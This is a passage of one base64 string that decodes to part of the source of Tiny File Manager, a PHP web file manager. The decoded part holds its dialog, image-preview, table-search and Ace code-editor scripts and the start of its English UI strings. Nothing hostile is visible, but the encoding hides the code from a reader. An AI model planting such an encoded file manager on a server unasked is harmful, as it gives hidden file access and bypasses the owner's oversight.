ZmlybURhaWxvZyIpLnJlbW92ZSgpOw0KICAgICAgICAkKCcjd3JhcHBlcicpLmFwcGVuZCh0ZW1wbGF0ZSh0cGwsdHBsT2JqKSk7DQogICAgICAgIGNvbnN0ICRjb25maXJtRGFpbG9nID0gJCgiI2NvbmZpcm1EYWlsb2ctIit0cGxPYmouaWQpOw0KICAgICAgICAkY29uZmlybURhaWxvZy5tb2RhbCgnc2hvdycpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIA0KDQogICAgLy8gb24gbW91c2UgaG92ZXIgaW1hZ2UgcHJldmlldw0KICAgICFmdW5jdGlvbihzKXtzLnByZXZpZXdJbWFnZT1mdW5jdGlvbihlKXt2YXIgbz1zKGRvY3VtZW50KSx0PSIucHJldmlld0ltYWdlIixhPXMuZXh0ZW5kKHt4T2Zmc2V0OjIwLHlPZmZzZXQ6LTIwLGZhZGVJbjoiZmFzdCIsY3NzOntwYWRkaW5nOiI1cHgiLGJvcmRlcjoiMXB4IHNvbGlkICNjY2NjY2MiLCJiYWNrZ3JvdW5kLWNvbG9yIjoiI2ZmZiJ9LGV2ZW50U2VsZWN0b3I6IltkYXRhLXByZXZpZXctaW1hZ2VdIixkYXRhS2V5OiJwcmV2aWV3SW1hZ2UiLG92ZXJsYXlJZDoicHJldmlldy1pbWFnZS1wbHVnaW4tb3ZlcmxheSJ9LGUpO3JldHVybiBvLm9mZih0KSxvLm9uKCJtb3VzZW92ZXIiK3QsYS5ldmVudFNlbGVjdG9yLGZ1bmN0aW9uKGUpe3MoInAjIithLm92ZXJsYXlJZCkucmVtb3ZlKCk7dmFyIG89cygiPHA+IikuYXR0cigiaWQiLGEub3ZlcmxheUlkKS5jc3MoInBvc2l0aW9uIiwiYWJzb2x1dGUiKS5jc3MoImRpc3BsYXkiLCJub25lIikuYXBwZW5kKHMoJzxpbWcgY2xhc3M9ImMtcHJldmlldy1pbWciPicpLmF0dHIoInNyYyIscyh0aGlzKS5kYXRhKGEuZGF0YUtleSkpKTthLmNzcyYmby5jc3MoYS5jc3MpLHMoImJvZHkiKS5hcHBlbmQobyksby5jc3MoInRvcCIsZS5wYWdlWSthLnlPZmZzZXQrInB4IikuY3NzKCJsZWZ0IixlLnBhZ2VYK2EueE9mZnNldCsicHgiKS5mYWRlSW4oYS5mYWRlSW4pfSksby5vbigibW91c2VvdXQiK3QsYS5ldmVudFNlbGVjdG9yLGZ1bmN0aW9uKCl7cygiIyIrYS5vdmVybGF5SWQpLnJlbW92ZSgpfSksby5vbigibW91c2Vtb3ZlIit0LGEuZXZlbnRTZWxlY3RvcixmdW5jdGlvbihlKXtzKCIjIithLm92ZXJsYXlJZCkuY3NzKCJ0b3AiLGUucGFnZVkrYS55T2Zmc2V0KyJweCIpLmNzcygibGVmdCIsZS5wYWdlWCthLnhPZmZzZXQrInB4Iil9KSx0aGlzfSxzLnByZXZpZXdJbWFnZSgpfShqUXVlcnkpOw0KDQogICAgLy8gRG9tIFJlYWR5IEV2ZW50cw0KICAgICQoZG9jdW1lbnQpLnJlYWR5KCBmdW5jdGlvbiAoKSB7DQogICAgICAgIC8vIGRhdGFUYWJsZSBpbml0DQogICAgICAgIHZhciAkdGFibGUgPSAkKCcjbWFpbi10YWJsZScpLA0KICAgICAgICAgICAgdGFibGVMbmcgPSAkdGFibGUuZmluZCgndGgnKS5sZW5ndGgsDQogICAgICAgICAgICBfdGFyZ2V0cyA9ICh0YWJsZUxuZyAmJiB0YWJsZUxuZyA9PSA3ICkgPyBbMCwgNCw1LDZdIDogdGFibGVMbmcgPT0gNSA/IFswLDRdIDogWzNdOw0KICAgICAgICAgICAgbWFpblRhYmxlID0gJCgnI21haW4tdGFibGUnKS5EYXRhVGFibGUoe3BhZ2luZzogZmFsc2UsIGluZm86IGZhbHNlLCBvcmRlcjogW10sIGNvbHVtbkRlZnM6IFt7dGFyZ2V0czogX3RhcmdldHMsIG9yZGVyYWJsZTogZmFsc2V9XQ0KICAgICAgICB9KTsNCiAgICAgICAgLy8gZmlsdGVyIHRhYmxlDQogICAgICAgICQoJyNzZWFyY2gtYWRkb24nKS5vbiggJ2tleXVwJywgZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgbWFpblRhYmxlLnNlYXJjaCggdGhpcy52YWx1ZSApLmRyYXcoKTsNCiAgICAgICAgfSk7DQogICAgICAgICQoImlucHV0I2FkdmFuY2VkLXNlYXJjaCIpLm9uKCdrZXl1cCcsIGZ1bmN0aW9uIChlKSB7DQogICAgICAgICAgICBpZiAoZS5rZXlDb2RlID09PSAxMykgeyBmbV9zZWFyY2goKTsgfQ0KICAgICAgICB9KTsNCiAgICAgICAgJCgnI3NlYXJjaC1hZGRvbjMnKS5vbiggJ2NsaWNrJywgZnVuY3Rpb24gKCkgeyBmbV9zZWFyY2goKTsgfSk7DQogICAgICAgIC8vdXBsb2FkIG5hdiB0YWJzDQogICAgICAgICQoIi5mbS11cGxvYWQtd3JhcHBlciAuY2FyZC1oZWFkZXItdGFicyIpLm9uKCJjbGljayIsICdhJywgZnVuY3Rpb24oZSl7DQogICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7bGV0IHRhcmdldD0kKHRoaXMpLmRhdGEoJ3RhcmdldCcpOw0KICAgICAgICAgICAgJCgiLmZtLXVwbG9hZC13cmFwcGVyIC5jYXJkLWhlYWRlci10YWJzIGEiKS5yZW1vdmVDbGFzcygnYWN0aXZlJyk7JCh0aGlzKS5hZGRDbGFzcygnYWN0aXZlJyk7DQogICAgICAgICAgICAkKCIuZm0tdXBsb2FkLXdyYXBwZXIgLmNhcmQtdGFicy1jb250YWluZXIiKS5hZGRDbGFzcygnaGlkZGVuJyk7JCh0YXJnZXQpLnJlbW92ZUNsYXNzKCdoaWRkZW4nKTsNCiAgICAgICAgfSk7DQogICAgfSk7DQo8L3NjcmlwdD4NCjw/cGhwIGlmIChpc3NldCgkX0dFVFsnZWRpdCddKSAmJiBpc3NldCgkX0dFVFsnZW52J10pICYmIEZNX0VESVRfRklMRSAmJiAhRk1fUkVBRE9OTFkpOg0KICAgICAgICANCiAgICAgICAgJGV4dCA9IHBhdGhpbmZvKCRfR0VUWyJlZGl0Il0sIFBBVEhJTkZPX0VYVEVOU0lPTik7DQogICAgICAgICRleHQgPSAgJGV4dCA9PSAianMiID8gImphdmFzY3JpcHQiIDogICRleHQ7DQogICAgICAgID8+DQogICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2pzLWFjZScpOyA/Pg0KICAgIDxzY3JpcHQ+DQogICAgICAgIHZhciBlZGl0b3IgPSBhY2UuZWRpdCgiZWRpdG9yIik7DQogICAgICAgIGVkaXRvci5nZXRTZXNzaW9uKCkuc2V0TW9kZSgge3BhdGg6ImFjZS9tb2RlLzw/cGhwIGVjaG8gJGV4dDsgPz4iLCBpbmxpbmU6dHJ1ZX0gKTsNCiAgICAgICAgLy9lZGl0b3Iuc2V0VGhlbWUoImFjZS90aGVtZS90d2lsaWdodCIpOyAvL0RhcmsgVGhlbWUNCiAgICAgICAgZWRpdG9yLnNldFNob3dQcmludE1hcmdpbihmYWxzZSk7IC8vIEhpZGUgdGhlIHZlcnRpY2FsIHJ1bGVyDQogICAgICAgIGZ1bmN0aW9uIGFjZV9jb21tZW5kIChjbWQpIHsgZWRpdG9yLmNvbW1hbmRzLmV4ZWMoY21kLCBlZGl0b3IpOyB9DQogICAgICAgIGVkaXRvci5jb21tYW5kcy5hZGRDb21tYW5kcyhbew0KICAgICAgICAgICAgbmFtZTogJ3NhdmUnLCBiaW5kS2V5OiB7d2luOiAnQ3RybC1TJywgIG1hYzogJ0NvbW1hbmQtUyd9LA0KICAgICAgICAgICAgZXhlYzogZnVuY3Rpb24oZWRpdG9yKSB7IGVkaXRfc2F2ZSh0aGlzLCAnYWNlJyk7IH0NCiAgICAgICAgfV0pOw0KICAgICAgICBmdW5jdGlvbiByZW5kZXJUaGVtZU1vZGUoKSB7DQogICAgICAgICAgICB2YXIgJG1vZGVFbCA9ICQoInNlbGVjdCNqcy1hY2UtbW9kZSIpLCAkdGhlbWVFbCA9ICQoInNlbGVjdCNqcy1hY2UtdGhlbWUiKSwgJGZvbnRTaXplRWwgPSAkKCJzZWxlY3QjanMtYWNlLWZvbnRTaXplIiksIG9wdGlvbk5vZGUgPSBmdW5jdGlvbih0eXBlLCBhcnIpeyB2YXIgJE9wdGlvbiA9ICIiOyAkLmVhY2goYXJyLCBmdW5jdGlvbihpLCB2YWwpIHsgJE9wdGlvbiArPSAiPG9wdGlvbiB2YWx1ZT0nIit0eXBlK2krIic+IiArIHZhbCArICI8L29wdGlvbj4iOyB9KTsgcmV0dXJuICRPcHRpb247IH0sDQogICAgICAgICAgICAgICAgX2RhdGEgPSB7ImFjZVRoZW1lIjp7ImJyaWdodCI6eyJjaHJvbWUiOiJDaHJvbWUiLCJjbG91ZHMiOiJDbG91ZHMiLCJjcmltc29uX2VkaXRvciI6IkNyaW1zb24gRWRpdG9yIiwiZGF3biI6IkRhd24iLCJkcmVhbXdlYXZlciI6IkRyZWFtd2VhdmVyIiwiZWNsaXBzZSI6IkVjbGlwc2UiLCJnaXRodWIiOiJHaXRIdWIiLCJpcGxhc3RpYyI6IklQbGFzdGljIiwic29sYXJpemVkX2xpZ2h0IjoiU29sYXJpemVkIExpZ2h0IiwidGV4dG1hdGUiOiJUZXh0TWF0ZSIsInRvbW9ycm93IjoiVG9tb3Jyb3ciLCJ4Y29kZSI6IlhDb2RlIiwia3Vyb2lyIjoiS3Vyb2lyIiwia2F0emVubWlsY2giOiJLYXR6ZW5NaWxjaCIsInNxbHNlcnZlciI6IlNRTCBTZXJ2ZXIifSwiZGFyayI6eyJhbWJpYW5jZSI6IkFtYmlhbmNlIiwiY2hhb3MiOiJDaGFvcyIsImNsb3Vkc19taWRuaWdodCI6IkNsb3VkcyBNaWRuaWdodCIsImRyYWN1bGEiOiJEcmFjdWxhIiwiY29iYWx0IjoiQ29iYWx0IiwiZ3J1dmJveCI6IkdydXZib3giLCJnb2IiOiJHcmVlbiBvbiBCbGFjayIsImlkbGVfZmluZ2VycyI6ImlkbGUgRmluZ2VycyIsImtyX3RoZW1lIjoia3JUaGVtZSIsIm1lcmJpdm9yZSI6Ik1lcmJpdm9yZSIsIm1lcmJpdm9yZV9zb2Z0IjoiTWVyYml2b3JlIFNvZnQiLCJtb25vX2luZHVzdHJpYWwiOiJNb25vIEluZHVzdHJpYWwiLCJtb25va2FpIjoiTW9ub2thaSIsInBhc3RlbF9vbl9kYXJrIjoiUGFzdGVsIG9uIGRhcmsiLCJzb2xhcml6ZWRfZGFyayI6IlNvbGFyaXplZCBEYXJrIiwidGVybWluYWwiOiJUZXJtaW5hbCIsInRvbW9ycm93X25pZ2h0IjoiVG9tb3Jyb3cgTmlnaHQiLCJ0b21vcnJvd19uaWdodF9ibHVlIjoiVG9tb3Jyb3cgTmlnaHQgQmx1ZSIsInRvbW9ycm93X25pZ2h0X2JyaWdodCI6IlRvbW9ycm93IE5pZ2h0IEJyaWdodCIsInRvbW9ycm93X25pZ2h0X2VpZ2h0aWVzIjoiVG9tb3Jyb3cgTmlnaHQgODBzIiwidHdpbGlnaHQiOiJUd2lsaWdodCIsInZpYnJhbnRfaW5rIjoiVmlicmFudCBJbmsifX0sImFjZU1vZGUiOnsiamF2YXNjcmlwdCI6IkphdmFTY3JpcHQiLCJhYmFwIjoiQUJBUCIsImFiYyI6IkFCQyIsImFjdGlvbnNjcmlwdCI6IkFjdGlvblNjcmlwdCIsImFkYSI6IkFEQSIsImFwYWNoZV9jb25mIjoiQXBhY2hlIENvbmYiLCJhc2NpaWRvYyI6IkFzY2lpRG9jIiwiYXNsIjoiQVNMIiwiYXNzZW1ibHlfeDg2IjoiQXNzZW1ibHkgeDg2IiwiYXV0b2hvdGtleSI6IkF1dG9Ib3RLZXkiLCJhcGV4IjoiQXBleCIsImJhdGNoZmlsZSI6IkJhdGNoRmlsZSIsImJybyI6IkJybyIsImNfY3BwIjoiQyBhbmQgQysrIiwiYzlzZWFyY2giOiJDOVNlYXJjaCIsImNpcnJ1IjoiQ2lycnUiLCJjbG9qdXJlIjoiQ2xvanVyZSIsImNvYm9sIjoiQ29ib2wiLCJjb2ZmZWUiOiJDb2ZmZWVTY3JpcHQiLCJjb2xkZnVzaW9uIjoiQ29sZEZ1c2lvbiIsImNzaGFycCI6IkMjIiwiY3NvdW5kX2RvY3VtZW50IjoiQ3NvdW5kIERvY3VtZW50IiwiY3NvdW5kX29yY2hlc3RyYSI6IkNzb3VuZCIsImNzb3VuZF9zY29yZSI6IkNzb3VuZCBTY29yZSIsImNzcyI6IkNTUyIsImN1cmx5IjoiQ3VybHkiLCJkIjoiRCIsImRhcnQiOiJEYXJ0IiwiZGlmZiI6IkRpZmYiLCJkb2NrZXJmaWxlIjoiRG9ja2VyZmlsZSIsImRvdCI6IkRvdCIsImRyb29scyI6IkRyb29scyIsImVkaWZhY3QiOiJFZGlmYWN0IiwiZWlmZmVsIjoiRWlmZmVsIiwiZWpzIjoiRUpTIiwiZWxpeGlyIjoiRWxpeGlyIiwiZWxtIjoiRWxtIiwiZXJsYW5nIjoiRXJsYW5nIiwiZm9ydGgiOiJGb3J0aCIsImZvcnRyYW4iOiJGb3J0cmFuIiwiZnNoYXJwIjoiRlNoYXJwIiwiZnNsIjoiRlNMIiwiZnRsIjoiRnJlZU1hcmtlciIsImdjb2RlIjoiR2NvZGUiLCJnaGVya2luIjoiR2hlcmtpbiIsImdpdGlnbm9yZSI6IkdpdGlnbm9yZSIsImdsc2wiOiJHbHNsIiwiZ29ic3RvbmVzIjoiR29ic3RvbmVzIiwiZ29sYW5nIjoiR28iLCJncmFwaHFsc2NoZW1hIjoiR3JhcGhRTFNjaGVtYSIsImdyb292eSI6Ikdyb292eSIsImhhbWwiOiJIQU1MIiwiaGFuZGxlYmFycyI6IkhhbmRsZWJhcnMiLCJoYXNrZWxsIjoiSGFza2VsbCIsImhhc2tlbGxfY2FiYWwiOiJIYXNrZWxsIENhYmFsIiwiaGF4ZSI6ImhhWGUiLCJoanNvbiI6Ikhqc29uIiwiaHRtbCI6IkhUTUwiLCJodG1sX2VsaXhpciI6IkhUTUwgKEVsaXhpcikiLCJodG1sX3J1YnkiOiJIVE1MIChSdWJ5KSIsImluaSI6IklOSSIsImlvIjoiSW8iLCJqYWNrIjoiSmFjayIsImphZGUiOiJKYWRlIiwiamF2YSI6IkphdmEiLCJqc29uIjoiSlNPTiIsImpzb25pcSI6IkpTT05pcSIsImpzcCI6IkpTUCIsImpzc20iOiJKU1NNIiwianN4IjoiSlNYIiwianVsaWEiOiJKdWxpYSIsImtvdGxpbiI6IktvdGxpbiIsImxhdGV4IjoiTGFUZVgiLCJsZXNzIjoiTEVTUyIsImxpcXVpZCI6IkxpcXVpZCIsImxpc3AiOiJMaXNwIiwibGl2ZXNjcmlwdCI6IkxpdmVTY3JpcHQiLCJsb2dpcWwiOiJMb2dpUUwiLCJsc2wiOiJMU0wiLCJsdWEiOiJMdWEiLCJsdWFwYWdlIjoiTHVhUGFnZSIsImx1Y2VuZSI6Ikx1Y2VuZSIsIm1ha2VmaWxlIjoiTWFrZWZpbGUiLCJtYXJrZG93biI6Ik1hcmtkb3duIiwibWFzayI6Ik1hc2siLCJtYXRsYWIiOiJNQVRMQUIiLCJtYXplIjoiTWF6ZSIsIm1lbCI6Ik1FTCIsIm1peGFsIjoiTUlYQUwiLCJtdXNoY29kZSI6Ik1VU0hDb2RlIiwibXlzcWwiOiJNeVNRTCIsIm5peCI6Ik5peCIsIm5zaXMiOiJOU0lTIiwib2JqZWN0aXZlYyI6Ik9iamVjdGl2ZS1DIiwib2NhbWwiOiJPQ2FtbCIsInBhc2NhbCI6IlBhc2NhbCIsInBlcmwiOiJQZXJsIiwicGVybDYiOiJQZXJsIDYiLCJwZ3NxbCI6InBnU1FMIiwicGhwX2xhcmF2ZWxfYmxhZGUiOiJQSFAgKEJsYWRlIFRlbXBsYXRlKSIsInBocCI6IlBIUCIsInB1cHBldCI6IlB1cHBldCIsInBpZyI6IlBpZyIsInBvd2Vyc2hlbGwiOiJQb3dlcnNoZWxsIiwicHJhYXQiOiJQcmFhdCIsInByb2xvZyI6IlByb2xvZyIsInByb3BlcnRpZXMiOiJQcm9wZXJ0aWVzIiwicHJvdG9idWYiOiJQcm90b2J1ZiIsInB5dGhvbiI6IlB5dGhvbiIsInIiOiJSIiwicmF6b3IiOiJSYXpvciIsInJkb2MiOiJSRG9jIiwicmVkIjoiUmVkIiwicmh0bWwiOiJSSFRNTCIsInJzdCI6IlJTVCIsInJ1YnkiOiJSdWJ5IiwicnVzdCI6IlJ1c3QiLCJzYXNzIjoiU0FTUyIsInNjYWQiOiJTQ0FEIiwic2NhbGEiOiJTY2FsYSIsInNjaGVtZSI6IlNjaGVtZSIsInNjc3MiOiJTQ1NTIiwic2giOiJTSCIsInNqcyI6IlNKUyIsInNsaW0iOiJTbGltIiwic21hcnR5IjoiU21hcnR5Iiwic25pcHBldHMiOiJzbmlwcGV0cyIsInNveV90ZW1wbGF0ZSI6IlNveSBUZW1wbGF0ZSIsInNwYWNlIjoiU3BhY2UiLCJzcWwiOiJTUUwiLCJzcWxzZXJ2ZXIiOiJTUUxTZXJ2ZXIiLCJzdHlsdXMiOiJTdHlsdXMiLCJzdmciOiJTVkciLCJzd2lmdCI6IlN3aWZ0IiwidGNsIjoiVGNsIiwidGVycmFmb3JtIjoiVGVycmFmb3JtIiwidGV4IjoiVGV4IiwidGV4dCI6IlRleHQiLCJ0ZXh0aWxlIjoiVGV4dGlsZSIsInRvbWwiOiJUb21sIiwidHN4IjoiVFNYIiwidHdpZyI6IlR3aWciLCJ0eXBlc2NyaXB0IjoiVHlwZXNjcmlwdCIsInZhbGEiOiJWYWxhIiwidmJzY3JpcHQiOiJWQlNjcmlwdCIsInZlbG9jaXR5IjoiVmVsb2NpdHkiLCJ2ZXJpbG9nIjoiVmVyaWxvZyIsInZoZGwiOiJWSERMIiwidmlzdWFsZm9yY2UiOiJWaXN1YWxmb3JjZSIsIndvbGxvayI6IldvbGxvayIsInhtbCI6IlhNTCIsInhxdWVyeSI6IlhRdWVyeSIsInlhbWwiOiJZQU1MIiwiZGphbmdvIjoiRGphbmdvIn0sImZvbnRTaXplIjp7ODo4LDEwOjEwLDExOjExLDEyOjEyLDEzOjEzLDE0OjE0LDE1OjE1LDE2OjE2LDE3OjE3LDE4OjE4LDIwOjIwLDIyOjIyLDI0OjI0LDI2OjI2LDMwOjMwfX07DQogICAgICAgICAgICBpZihfZGF0YSAmJiBfZGF0YS5hY2VNb2RlKSB7ICRtb2RlRWwuaHRtbChvcHRpb25Ob2RlKCJhY2UvbW9kZS8iLCBfZGF0YS5hY2VNb2RlKSk7IH0NCiAgICAgICAgICAgIGlmKF9kYXRhICYmIF9kYXRhLmFjZVRoZW1lKSB7IHZhciBsaWdodFRoZW1lID0gb3B0aW9uTm9kZSgiYWNlL3RoZW1lLyIsIF9kYXRhLmFjZVRoZW1lLmJyaWdodCksIGRhcmtUaGVtZSA9IG9wdGlvbk5vZGUoImFjZS90aGVtZS8iLCBfZGF0YS5hY2VUaGVtZS5kYXJrKTsgJHRoZW1lRWwuaHRtbCgiPG9wdGdyb3VwIGxhYmVsPVwiQnJpZ2h0XCI+IitsaWdodFRoZW1lKyI8L29wdGdyb3VwPjxvcHRncm91cCBsYWJlbD1cIkRhcmtcIj4iK2RhcmtUaGVtZSsiPC9vcHRncm91cD4iKTt9DQogICAgICAgICAgICBpZihfZGF0YSAmJiBfZGF0YS5mb250U2l6ZSkgeyAkZm9udFNpemVFbC5odG1sKG9wdGlvbk5vZGUoIiIsIF9kYXRhLmZvbnRTaXplKSk7IH0NCiAgICAgICAgICAgICRtb2RlRWwudmFsKCBlZGl0b3IuZ2V0U2Vzc2lvbigpLiRtb2RlSWQgKTsNCiAgICAgICAgICAgICR0aGVtZUVsLnZhbCggZWRpdG9yLmdldFRoZW1lKCkgKTsNCiAgICAgICAgICAgICRmb250U2l6ZUVsLnZhbCgxMikuY2hhbmdlKCk7IC8vc2V0IGRlZmF1bHQgZm9udCBzaXplIGluIGRyb3AgZG93bg0KICAgICAgICB9DQoNCiAgICAgICAgJChmdW5jdGlvbigpew0KICAgICAgICAgICAgcmVuZGVyVGhlbWVNb2RlKCk7DQogICAgICAgICAgICAkKCIuanMtYWNlLXRvb2xiYXIiKS5vbigiY2xpY2siLCAnYnV0dG9uJywgZnVuY3Rpb24oZSl7DQogICAgICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICAgICAgICAgIGxldCBjbWRWYWx1ZSA9ICQodGhpcykuYXR0cigiZGF0YS1jbWQiKSwgZWRpdG9yT3B0aW9uID0gJCh0aGlzKS5hdHRyKCJkYXRhLW9wdGlvbiIpOw0KICAgICAgICAgICAgICAgIGlmKGNtZFZhbHVlICYmIGNtZFZhbHVlICE9ICJub25lIikgew0KICAgICAgICAgICAgICAgICAgICBhY2VfY29tbWVuZChjbWRWYWx1ZSk7DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmKGVkaXRvck9wdGlvbikgew0KICAgICAgICAgICAgICAgICAgICBpZihlZGl0b3JPcHRpb24gPT0gImZ1bGxzY3JlZW4iKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAodm9pZCAwIT09ZG9jdW1lbnQuZnVsbFNjcmVlbkVsZW1lbnQmJm51bGw9PT1kb2N1bWVudC5mdWxsU2NyZWVuRWxlbWVudHx8dm9pZCAwIT09ZG9jdW1lbnQubXNGdWxsc2NyZWVuRWxlbWVudCYmbnVsbD09PWRvY3VtZW50Lm1zRnVsbHNjcmVlbkVsZW1lbnR8fHZvaWQgMCE9PWRvY3VtZW50Lm1vekZ1bGxTY3JlZW4mJiFkb2N1bWVudC5tb3pGdWxsU2NyZWVufHx2b2lkIDAhPT1kb2N1bWVudC53ZWJraXRJc0Z1bGxTY3JlZW4mJiFkb2N1bWVudC53ZWJraXRJc0Z1bGxTY3JlZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAmJihlZGl0b3IuY29udGFpbmVyLnJlcXVlc3RGdWxsU2NyZWVuP2VkaXRvci5jb250YWluZXIucmVxdWVzdEZ1bGxTY3JlZW4oKTplZGl0b3IuY29udGFpbmVyLm1velJlcXVlc3RGdWxsU2NyZWVuP2VkaXRvci5jb250YWluZXIubW96UmVxdWVzdEZ1bGxTY3JlZW4oKTplZGl0b3IuY29udGFpbmVyLndlYmtpdFJlcXVlc3RGdWxsU2NyZWVuP2VkaXRvci5jb250YWluZXIud2Via2l0UmVxdWVzdEZ1bGxTY3JlZW4oRWxlbWVudC5BTExPV19LRVlCT0FSRF9JTlBVVCk6ZWRpdG9yLmNvbnRhaW5lci5tc1JlcXVlc3RGdWxsc2NyZWVuJiZlZGl0b3IuY29udGFpbmVyLm1zUmVxdWVzdEZ1bGxzY3JlZW4oKSk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZihlZGl0b3JPcHRpb24gPT0gIndyYXAiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBsZXQgd3JhcFN0YXR1cyA9IChlZGl0b3IuZ2V0U2Vzc2lvbigpLmdldFVzZVdyYXBNb2RlKCkpID8gZmFsc2UgOiB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWRpdG9yLmdldFNlc3Npb24oKS5zZXRVc2VXcmFwTW9kZSh3cmFwU3RhdHVzKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgJCgic2VsZWN0I2pzLWFjZS1tb2RlLCBzZWxlY3QjanMtYWNlLXRoZW1lLCBzZWxlY3QjanMtYWNlLWZvbnRTaXplIikub24oImNoYW5nZSIsIGZ1bmN0aW9uKGUpew0KICAgICAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgICAgICAgICBsZXQgc2VsZWN0ZWRWYWx1ZSA9ICQodGhpcykudmFsKCksIHNlbGVjdGlvblR5cGUgPSAkKHRoaXMpLmF0dHIoImRhdGEtdHlwZSIpOw0KICAgICAgICAgICAgICAgIGlmKHNlbGVjdGVkVmFsdWUgJiYgc2VsZWN0aW9uVHlwZSA9PSAibW9kZSIpIHsNCiAgICAgICAgICAgICAgICAgICAgZWRpdG9yLmdldFNlc3Npb24oKS5zZXRNb2RlKHNlbGVjdGVkVmFsdWUpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZihzZWxlY3RlZFZhbHVlICYmIHNlbGVjdGlvblR5cGUgPT0gInRoZW1lIikgew0KICAgICAgICAgICAgICAgICAgICBlZGl0b3Iuc2V0VGhlbWUoc2VsZWN0ZWRWYWx1ZSk7DQogICAgICAgICAgICAgICAgfWVsc2UgaWYoc2VsZWN0ZWRWYWx1ZSAmJiBzZWxlY3Rpb25UeXBlID09ICJmb250U2l6ZSIpIHsNCiAgICAgICAgICAgICAgICAgICAgZWRpdG9yLnNldEZvbnRTaXplKHBhcnNlSW50KHNlbGVjdGVkVmFsdWUpKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9KTsNCiAgICAgICAgfSk7DQogICAgPC9zY3JpcHQ+DQo8P3BocCBlbmRpZjsgPz4NCjxkaXYgaWQ9InNuYWNrYmFyIj48L2Rpdj4NCjwvYm9keT4NCjwvaHRtbD4NCjw/cGhwDQp9DQoNCi8qKg0KICogTGFuZ3VhZ2UgVHJhbnNsYXRpb24gU3lzdGVtDQogKiBAcGFyYW0gc3RyaW5nICR0eHQNCiAqIEByZXR1cm4gc3RyaW5nDQogKi8NCmZ1bmN0aW9uIGxuZygkdHh0KSB7DQogICAgZ2xvYmFsICRsYW5nOw0KDQogICAgLy8gRW5nbGlzaCBMYW5ndWFnZQ0KICAgICR0clsnZW4nXVsnQXBwTmFtZSddICAgICAgICA9ICdUaW55IEZpbGUgTWFuYWdlcic7ICAgICAgJHRyWydlbiddWydBcHBUaXRsZSddICAgICAgICAgICA9ICdGaWxlIE1hbmFnZXInOw0KICAgICR0clsnZW4nXVsnTG9naW4nXSAgICAgICAgICA9ICdTaWduIGluJzsgICAgICAgICAgICAgICAgJHRyWydlbiddWydVc2VybmFtZSddICAgICAgICAgICA9ICdVc2VybmFtZSc7DQogICAgJHRyWydlbiddWydQYXNzd29yZCddICAgICAgID0gJ1Bhc3N3b3JkJzsgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ0xvZ291dCddICAgICAgICAgICAgID0gJ1NpZ24gT3V0JzsNCiAgICAkdHJbJ2VuJ11bJ01vdmUnXSAgICAgICAgICAgPSAnTW92ZSc7ICAgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnQ29weSddICAgICAgICAgICAgICAgPSAnQ29weSc7DQogICAgJHRyWydlbiddWydTYXZlJ10gICAgICAgICAgID0gJ1NhdmUnOyAgICAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ1NlbGVjdEFsbCddICAgICAgICAgID0gJ1NlbGVjdCBhbGwnOw0KICAgICR0clsnZW4nXVsnVW5TZWxlY3RBbGwnXSAgICA9ICdVbnNlbGVjdCBhbGwnOyAgICAgICAgICAgJHRyWydlbiddWydGaWxlJ10gICAgICAgICAgICAgICA9ICdGaWxlJzsNCiAgICAkdHJbJ2VuJ11bJ0JhY2snXSAgICAgICAgICAgPSAnQmFjayc7ICAgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnU2l6ZSddICAgICAgICAgICAgICAgPSAnU2l6ZSc7DQogICAgJHRyWydlbiddWydQZXJtcyddICAgICAgICAgID0gJ1Blcm1zJzsgICAgICAgICAgICAgICAgICAkdHJbJ2VuJ11bJ01vZGlmaWVkJ10gICAgICAgICAgID0gJ01vZGlmaWVkJzsNCiAgICAkdHJbJ2VuJ11bJ093bmVyJ10gICAgICAgICAgPSAnT3duZXInOyAgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnU2VhcmNoJ10gICAgICAgICAgICAgPSAnU2VhcmNoJzsNCiAgICAkdHJbJ2VuJ11bJ05ld0l0ZW0nXSAgICAgICAgPSAnTmV3IEl0ZW0nOyAgICAgICAgICAgICAgICR0clsnZW4nXVsnRm9sZGVyJ10gICAgICAgICAgICAgPSAnRm9sZGVyJzsNCiAgICAkdHJbJ2VuJ11bJ0RlbGV0ZSddICAgICAgICAgPSAnRGVsZXRlJzsgICAgICAgICAgICAgICAgICR0clsnZW4nXVsnUmVuYW1lJ10gICAgICAgICAgICAgPSAnUmVuYW1lJzsNCiAgICAkdHJbJ2VuJ11bJ0NvcHlUbyddICAgICAgICAgPSAnQ29weSB0byc7ICAgICAgICAgICAgICAgICR0clsnZW4nXVsnRGlyZWN0TGluayddICAgICAgICAgPSAnRGlyZWN0IGxpbmsnOw0KICAgICR0clsnZW4nXVsnVXBsb2FkaW5nRmlsZXMnXSA9ICdVcGxvYWQgRmlsZXMnOyAgICAgICAgICAgJHRyWydlbiddWydDaGFuZ2VQZXJtaXNzaW9ucyddICA9ICdDaGFuZ2UgUGVybWlzc2lvbnMnOw0KICAgICR0clsnZW4nXVsnQ29weWluZyddICAgICAgICA9ICdDb3B5aW5nJzsgICAgICAgICAgICAgICAgJHRyWydlbiddWydDcmVhdGVOZXdJdGVtJ10gICAgICA9ICdDcmVhdGUgTmV3IEl0ZW0nOw0KICAgICR0clsnZW4nXVsnTmFtZSddICAgICAgICAgICA9ICdOYW1lJzsgICAgICAgICAgICAgICAgICAgJHRyWydlbiddWydBZHZhbmNlZEVkaXRvciddICAgICA9ICdBZHZhbmNlZCBFZGl0b3InOw0KICAgICR0clsnZW4nXVsnQWN0